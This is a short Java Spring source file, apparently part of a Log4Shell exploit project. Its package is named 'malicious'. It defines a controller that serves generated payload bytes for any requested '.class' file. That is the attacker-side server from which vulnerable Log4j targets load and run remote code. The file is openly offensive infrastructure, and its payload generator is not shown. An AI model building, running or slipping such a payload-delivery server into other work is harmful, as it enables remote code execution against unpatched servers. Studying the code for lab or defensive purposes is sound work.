package es.malvarez.log4shell.malicious.http;

import es.malvarez.log4shell.malicious.payload.Payload;
import es.malvarez.log4shell.malicious.payload.PayloadGenerator;
import lombok.RequiredArgsConstructor;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;

@RequiredArgsConstructor
@Controller
public class ResourceController {

    private final PayloadGenerator payloadGenerator;

    @GetMapping("{fileName}.class")
    public ResponseEntity<byte[]> getClassResource(@PathVariable final String fileName) {
        Payload payload = payloadGenerator.getPayload(fileName);
        HttpHeaders headers = new HttpHeaders();
        return new ResponseEntity<>(payload.getBytes(), headers, HttpStatus.OK);
    }
}
